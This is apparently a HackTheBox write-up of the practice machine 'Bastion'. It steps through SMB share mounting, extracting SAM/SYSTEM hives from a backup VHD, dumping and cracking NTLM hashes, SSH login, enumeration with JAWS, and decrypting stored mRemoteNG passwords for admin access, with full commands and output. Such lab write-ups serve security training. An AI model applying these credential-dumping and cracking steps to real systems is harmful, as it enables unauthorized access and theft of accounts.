---
title: HackTheBox - Bastion
date: 2021-08-15 03:19:06 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [SMB, smbclient, mount, VHD, guestmount, SAM, impacket-secretsdump, password cracking, hashcat, ssh, powershell, JAWS, mRemoteNG, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/bastion/Bastion.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Bastion-full-port-scan.txt 10.10.10.134
Warning: 10.10.10.134 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.134
Host is up (0.097s latency).
Not shown: 62478 closed ports, 3044 filtered ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h18m49s, deviation: 1h09m14s, median: 2h58m47s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-15T00:56:52+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-14T22:56:51
|_  start_date: 2021-08-14T22:51:16

```

### Port 139/445 (SMB)

#### Discovery

```console
$ smbclient -L //10.10.10.134/
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

#### Mounting share

`ADMIN$`, `C$` and `IPC$` are default share, which is not the cas for `Backups`. Let's try to mount this share:

```console
root@kali:~/htb/machines/Windows/Bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion/
Password for root@//10.10.10.134/Backups: 
root@kali:~/htb/machines/Windows/Bastion# cd /mnt/bastion/
root@kali:/mnt/bastion# ls
note.txt  SDT65CB.tmp  WindowsImageBackup
root@kali:/mnt/bastion# cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

> **Note**: when we have write permissions to a SMB share, we could leave **SCF** files to steal user/admin hashes. [Source](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-scf)

#### Mounting VHD

By exploring the share, we can see there are tow `.vhd` _(virtual hard drive)_ files:

```console
root@kali:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# du -hs *
37M     9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
5.1G    9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
4.0K    BackupSpecs.xml
4.0K    BackupSp.swp
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
12K     cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
8.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
4.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
8.0K    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
2.3M    cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```

We can use `7z l <VHD_file>` to list files or just mount them using `guestmount`: 

```bash
$ apt install libguestfs-tools -y
$ mkdir /mnt/vhd/
$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd/ -v
...
```

#### Extracting password hashes

Once the vhd mounted, we could go tho `Windows/System32/config/` directory where we can retrieve two interesting files:

1. the `SAM` database which contains all users password hashes
2. hashes are encrypted with a key which can be found in `SYSTEM`

> **Note**: if we were in a Domain controller, we would grab `NTDS.dit` also to extract the Active Directory Database

```console
root@kali:/mnt/vhd/Windows/System32/config# cp SAM ~/htb/machines/Windows/Bastion/
root@kali:/mnt/vhd/Windows/System32/config# cp SYSTEM ~/htb/machines/Windows/Bastion/
```

Now we can extract the hashes using tools like [`pwdump`](https://github.com/Neohapsis/creddump7.git) or `impacket-secretsdump`:

```bash
$ impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

> Hashes that begin with "`31d6`" are hashes of empty string which means that the account is either disabled or it has no password. This is why **Administrator** and **Guest** password hashes are the same. 

At this point, we can try to crack them using `hashcat` or perfom a **Pass The Hash**.

## Foothold

### Cracking NTLM hash using `hashcat`

```
$ cat > hashes.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
^C
$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
...
26112010952d963c8dc4217daec986d9:bureaulampje 
...
```

### SSH

The `nmap` scan shows us earlier that an SSH service was running. So let's try to log in:

![](/assets/img/htb/machines/windows/easy/bastion/ssh.png)

With `dir /a` we can list all files (included hidden ones):

```cmd
l4mpje@BASTION C:\Users\L4mpje>dir /a                                                                                                                        
 Volume in drive C has no label.                                                                                                                             
 Volume Serial Number is 0CB3-C487                                                                                                                           
                                                                                                                                                             
 Directory of C:\Users\L4mpje                                                                                                                                
                                                                                                                                                             
15-08-2021  03:04    <DIR>          .                                                                                                                        
15-08-2021  03:04    <DIR>          ..                                                                                                                       
22-02-2019  14:50    <DIR>          AppData                                                                                                                  
22-02-2019  14:50    <JUNCTION>     Application Data [C:\Users\L4mpje\AppData\Roaming]                                                                       
22-02-2019  16:26    <DIR>          Contacts                                                                                                                 
22-02-2019  14:50    <JUNCTION>     Cookies [C:\Users\L4mpje\AppData\Local\Microsoft\Windows\INetCookies]                                                    
22-02-2019  16:27    <DIR>          Desktop                                                                                                                  
22-02-2019  16:26    <DIR>          Documents                                                                                                                
22-02-2019  16:26    <DIR>          Downloads                                                                                                                
22-02-2019  16:26    <DIR>          Favorites                                                                                                                
15-08-2021  02:53            16.974 jaws-enum.ps1                                                                                                            
22-02-2019  16:26    <DIR>          Links                                                                                                                    
22-02-2019  14:50    <JUNCTION>     Local Settings [C:\Users\L4mpje\AppData\Local]                                                                           
22-02-2019  16:26    <DIR>          Music                                                                                                                    
22-02-2019  14:50    <JUNCTION>     My Documents [C:\Users\L4mpje\Documents]                                                                                 
22-02-2019  14:50    <JUNCTION>     NetHood [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Network Shortcuts]                                            
15-08-2021  01:02           786.432 NTUSER.DAT                                                                                                               
22-02-2019  14:50           196.608 ntuser.dat.LOG1                                                                                                          
22-02-2019  14:50           131.072 ntuser.dat.LOG2                                                                                                          
22-02-2019  15:03            65.536 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TM.blf                                                                  
22-02-2019  15:03           524.288 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TMContainer00000000000000000001.regtrans-ms                             
22-02-2019  15:03           524.288 NTUSER.DAT{334e114d-78e5-11e6-840e-ead53ba0b534}.TMContainer00000000000000000002.regtrans-ms                             
22-02-2019  14:50                20 ntuser.ini                                                                                                               
22-02-2019  16:26    <DIR>          Pictures                                                                                                                 
22-02-2019  14:50    <JUNCTION>     PrintHood [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Printer Shortcuts]                                          
22-02-2019  14:50    <JUNCTION>     Recent [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Recent]                                                        
22-02-2019  16:26    <DIR>          Saved Games                                                                                                              
22-02-2019  16:26    <DIR>          Searches                                                                                                                 
22-02-2019  14:50    <JUNCTION>     SendTo [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\SendTo]                                                        
22-02-2019  14:50    <JUNCTION>     Start Menu [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu]                                                
22-02-2019  14:50    <JUNCTION>     Templates [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Templates]                                                  
22-02-2019  16:26    <DIR>          Videos                                                                                                                   
15-08-2021  02:44         1.920.000 winPEASx64.exe                                                                                                           
               9 File(s)      4.165.218 bytes                                                                                                                
              24 Dir(s)  11.312.275.456 bytes free 
```

### JAWS - Just Another Windows (Enum) Script

We can upload [JAWS](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1) using `scp`:

```bash
$ wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
--2021-08-14 23:53:56--  https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16974 (17K) [text/plain]
Saving to: ‘jaws-enum.ps1’

jaws-enum.ps1                           100%[============================================================================>]  16.58K  --.-KB/s    in 0.02s   

2021-08-14 23:53:57 (939 KB/s) - ‘jaws-enum.ps1’ saved [16974/16974]

$ scp jaws-enum.ps1 L4mpje@$TARGET:
L4mpje@10.10.10.134's password: 
jaws-enum.ps1                                                                                                              100%   17KB  77.9KB/s   00:00
```

Then, execute it via `powershell`:

```powershell
l4mpje@BASTION C:\Users\L4mpje>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\L4mpje> .\jaws-enum.ps1 
```

There is an application that looks unique:

![](/assets/img/htb/machines/windows/easy/bastion/mRemoteNG.png)

## Privesc

This [script](https://github.com/haseebT/mRemoteNG-Decrypt) will decrypt passwords stored by **mRemoteNG**.

We need to grab a configuration file in `:\Users\L4mpje\AppData\Roaming\mRemoteNG\` that contains a password:

![](/assets/img/htb/machines/windows/easy/bastion/confConfs.png)

Here we go!

```bash
$ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
Password: bureaulampje
$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

![](/assets/img/htb/machines/windows/easy/bastion/admin.png)

___

## Useful links

- [Execution via .SCF](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-scf)
- [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)

<!-- - [Twitter Benjamin Delpy - ](https://twitter.com/gentilkiwi/status/1417467063883476992?s=20) -->
